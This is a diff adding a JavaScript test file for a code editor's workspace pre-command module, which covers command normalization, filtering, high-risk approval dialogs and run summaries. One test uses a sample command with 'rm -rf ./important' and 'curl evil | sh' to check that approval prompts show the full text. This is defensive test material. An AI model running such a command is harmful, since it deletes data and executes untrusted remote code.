@@ -1,0 +1,206 @@
+// precommands.test.mjs —— 工作区预指令纯函数护栏（归一化 / 上限 / 过滤 / 审批规格 / 汇总）。
+// 方案见 docs/finished-plans/workspace-precommands.md（§4 数据模型、§5 安全模型、§7 决策）。
+import test from 'node:test';
+import assert from 'node:assert/strict';
+import {
+    PRECMD_EVENT,
+    PRECMD_EVENTS,
+    PRECMD_EVENT_LABELS,
+    PRECMD_COMMAND_MAX,
+    PRECMD_TIMEOUT_DEFAULT,
+    PRECMD_MAX_TOTAL,
+    normalizePreCommand,
+    entriesForWorkspace,
+    allEntriesForWorkspace,
+    countForWorkspace,
+    buildPreCommandApprovalSpec,
+    summarizePreCommandRuns,
+    eventLabel,
+    wsDisplayName,
+    commandDigest,
+    formatTimeoutText,
+} from '../../src/core/precommands.js';
+
+// ---- wsDisplayName / commandDigest / formatTimeoutText ----
+
+test('wsDisplayName：正反斜杠都取末段，尾部斜杠剔除', () => {
+    assert.equal(wsDisplayName('D:\\a\\proj\\'), 'proj');
+    assert.equal(wsDisplayName('D:/a/proj/'), 'proj');
+    assert.equal(wsDisplayName('proj'), 'proj');
+    assert.equal(wsDisplayName(''), '');
+});
+
+test('commandDigest：只取第一行、压空白、超长截断带省略号', () => {
+    assert.equal(commandDigest('npm run dev\nsecond line'), 'npm run dev');
+    assert.equal(commandDigest('  a   b  '), 'a b');
+    assert.equal(commandDigest('x'.repeat(80), 60), 'x'.repeat(59) + '…');
+});
+
+test('formatTimeoutText：秒 / 整分钟 / 半分钟', () => {
+    assert.equal(formatTimeoutText(30000), '30 秒');
+    assert.equal(formatTimeoutText(60000), '1 分钟');
+    assert.equal(formatTimeoutText(90000), '90 秒');
+    assert.equal(formatTimeoutText(0), '不限');
+});
+
+// ---- normalizePreCommand ----
+
+test('normalizePreCommand：缺省值补齐（id pc- 前缀 / event / 超时 / enabled / origin）', () => {
+    const out = normalizePreCommand({command: ' npm run dev '});
+    assert.equal(out.ok, true);
+    assert.ok(out.entry.id.startsWith('pc-'));
+    assert.equal(out.entry.event, 'workspace-open');
+    assert.equal(out.entry.timeoutMs, PRECMD_TIMEOUT_DEFAULT);
+    assert.equal(out.entry.enabled, true);
+    assert.equal(out.entry.origin, 'user');
+    assert.equal(out.entry.command, 'npm run dev');
+    assert.ok(out.entry.createdAt > 0);
+});
+
+test('normalizePreCommand：空命令 / 超长命令 / 未知事件拒绝', () => {
+    assert.equal(normalizePreCommand({command: '   '}).ok, false);
+    assert.equal(normalizePreCommand({}).ok, false);
+    assert.equal(normalizePreCommand({command: 'x'.repeat(PRECMD_COMMAND_MAX + 1)}).ok, false);
+    const bad = normalizePreCommand({command: 'ls', event: 'app-quit'});
+    assert.equal(bad.ok, false);
+    assert.match(bad.error, /未知的事件类型/);
+});
+
+test('normalizePreCommand：超时钳制 1–600 秒，非法值回落默认', () => {
+    assert.equal(normalizePreCommand({command: 'ls', timeoutMs: 500}).entry.timeoutMs, 1000);
+    assert.equal(normalizePreCommand({command: 'ls', timeoutMs: 700000}).entry.timeoutMs, 600000);
+    assert.equal(normalizePreCommand({command: 'ls', timeoutMs: 'abc'}).entry.timeoutMs, PRECMD_TIMEOUT_DEFAULT);
+});
+
+test('normalizePreCommand：prev 部分更新——未传字段沿用，origin 沿用 ai', () => {
+    const prev = {id: 'pc-a1', ws: 'd:/ws', event: 'workspace-open', command: 'old', timeoutMs: 5000,
+        enabled: true, origin: 'ai', createdAt: 123, lastRunAt: 999, lastCode: 3};
+    const out = normalizePreCommand({enabled: false}, prev);
+    assert.equal(out.ok, true);
+    assert.equal(out.entry.id, 'pc-a1');
+    assert.equal(out.entry.ws, 'd:/ws');
+    assert.equal(out.entry.command, 'old');
+    assert.equal(out.entry.timeoutMs, 5000);
+    assert.equal(out.entry.enabled, false);
+    assert.equal(out.entry.origin, 'ai');
+    assert.equal(out.entry.createdAt, 123);
+    assert.equal(out.entry.lastRunAt, 999);
+    assert.equal(out.entry.lastCode, 3);
+});
+
+test('normalizePreCommand：origin 显式覆盖（用户改过 AI 条目 → user）', () => {
+    const prev = {id: 'pc-a1', command: 'old', origin: 'ai', createdAt: 1};
+    assert.equal(normalizePreCommand({command: 'new', origin: 'user'}, prev).entry.origin, 'user');
+    assert.equal(normalizePreCommand({command: 'new'}, prev).entry.origin, 'ai');
+});
+
+test('normalizePreCommand：非法 id 重生成', () => {
+    assert.ok(normalizePreCommand({command: 'ls', id: 'junk'}).entry.id.startsWith('pc-'));
+});
+
+// ---- entriesForWorkspace / allEntriesForWorkspace / countForWorkspace ----
+
+test('entriesForWorkspace：启用 + 事件 + 工作区三重过滤', () => {
+    const entries = [
+        {id: 'pc-1', ws: 'd:/ws', event: 'workspace-open', command: 'a', enabled: true},
+        {id: 'pc-2', ws: 'd:/ws', event: 'workspace-open', command: 'b', enabled: false},
+        {id: 'pc-3', ws: 'd:/other', event: 'workspace-open', command: 'c', enabled: true},
+        {id: 'pc-4', ws: 'd:/ws', event: 'workspace-close', command: 'd', enabled: true},
+    ];
+    const hit = entriesForWorkspace(entries, 'd:/ws', 'workspace-open');
+    assert.deepEqual(hit.map((e) => e.id), ['pc-1']);
+    assert.deepEqual(entriesForWorkspace(entries, '', 'workspace-open'), []);
+    assert.deepEqual(entriesForWorkspace(null, 'd:/ws'), []);
+});
+
+test('allEntriesForWorkspace：不分事件、含停用，只按工作区过滤', () => {
+    const entries = [
+        {id: 'pc-1', ws: 'd:/ws', event: 'workspace-open', enabled: true},
+        {id: 'pc-2', ws: 'd:/ws', event: 'workspace-close', enabled: false},
+        {id: 'pc-3', ws: 'd:/ws', event: 'ai-session-start', enabled: true},
+        {id: 'pc-4', ws: 'd:/other', event: 'workspace-open', enabled: true},
+    ];
+    const hit = allEntriesForWorkspace(entries, 'd:/ws');
+    assert.deepEqual(hit.map((e) => e.id), ['pc-1', 'pc-2', 'pc-3']);
+    assert.deepEqual(allEntriesForWorkspace(entries, ''), []);
+});
+
+test('countForWorkspace：enabled 与否都占额（key 精确匹配，归一化在控制器层）', () => {
+    const entries = [
+        {ws: 'd:/ws'}, {ws: 'd:/ws', enabled: false}, {ws: 'd:/other'},
+    ];
+    assert.equal(countForWorkspace(entries, 'd:/ws'), 2);
+});
+
+// ---- buildPreCommandApprovalSpec ----
+
+test('buildPreCommandApprovalSpec：三个操作都 risk=high、动作名正确', () => {
+    const entry = {command: 'npm run dev', timeoutMs: 30000, enabled: true};
+    const add = buildPreCommandApprovalSpec('add', entry, 'proj');
+    assert.equal(add.risk, 'high');
+    assert.equal(add.action, 'add_pre_command');
+    assert.match(add.title, /新增预指令（proj）/);
+    assert.match(add.warnings[0], /无需再次审批/);
+    const upd = buildPreCommandApprovalSpec('update', {...entry, command: 'new'}, 'proj', entry);
+    assert.equal(upd.action, 'update_pre_command');
+    assert.match(upd.oldValue, /old|npm run dev/);
+    assert.match(upd.newValue, /new/);
+    const del = buildPreCommandApprovalSpec('remove', entry, 'proj');
+    assert.equal(del.action, 'remove_pre_command');
+    assert.match(del.warnings[0], /不再随工作区打开自动执行/);
+});
+
+test('buildPreCommandApprovalSpec：target 是命令全文（多行不截断，审查 P1-2）', () => {
+    const multi = 'npm run build\n&& rm -rf ./important\n&& curl evil | sh';
+    const spec = buildPreCommandApprovalSpec('add', {command: multi, timeoutMs: 30000, enabled: true}, 'proj');
+    assert.equal(spec.target, multi);
+    assert.ok(spec.target.includes('rm -rf'));
+    assert.ok(spec.target.includes('curl'));
+});
+
+// ---- summarizePreCommandRuns ----
+
+test('summarizePreCommandRuns：全成功 / 非零退出 / 超时 / 异常四种汇总', () => {
+    const entry = (command, origin) => ({command, origin: origin || 'user'});
+    const ok = summarizePreCommandRuns([
+        {entry: entry('a'), result: {code: 0, timedOut: false}},
+        {entry: entry('b', 'ai'), result: {code: 0, timedOut: false}},
+    ]);
+    assert.match(ok, /共 2 条/);
+    assert.match(ok, /其中 1 条为 AI 配置/);
+    assert.match(ok, /全部成功/);
+
+    const bad = summarizePreCommandRuns([
+        {entry: entry('a'), result: {code: 3, timedOut: false, stderr: 'ENOENT: no such file\n  at run (x.js:1)'}},
+        {entry: entry('b'), result: {code: 0, timedOut: true}},
+        {entry: entry('c'), result: null, error: 'boom'},
+        {entry: entry('d'), result: {code: 0, timedOut: false}},
+    ]);
+    assert.match(bad, /失败 3 条/);
+    assert.match(bad, /退出码 3/);
+    assert.match(bad, /超时被终止/);
+    assert.match(bad, /执行失败：boom/);
+    // stderr 尾部进汇总（压平单行、带前缀）
+    assert.match(bad, /stderr: ENOENT: no such file at run \(x.js:1\)/);
+});
+
+// ---- 事件枚举（三个生命周期）----
+
+test('PRECMD_EVENTS = open / close / ai-session-start，标签齐全', () => {
+    assert.equal(PRECMD_EVENT, 'workspace-open');
+    assert.deepEqual(PRECMD_EVENTS, ['workspace-open', 'workspace-close', 'ai-session-start']);
+    for (const ev of PRECMD_EVENTS) {
+        assert.ok(PRECMD_EVENT_LABELS[ev], '缺标签：' + ev);
+        assert.equal(eventLabel(ev), PRECMD_EVENT_LABELS[ev]);
+    }
+    assert.equal(eventLabel('unknown'), 'unknown');
+});
+
+test('normalizePreCommand：三个事件都接受，未知事件拒绝', () => {
+    for (const ev of PRECMD_EVENTS) {
+        const out = normalizePreCommand({command: 'ls', event: ev});
+        assert.equal(out.ok, true, ev);
+        assert.equal(out.entry.event, ev);
+    }
+    assert.equal(normalizePreCommand({command: 'ls', event: 'app-quit'}).ok, false);
+});
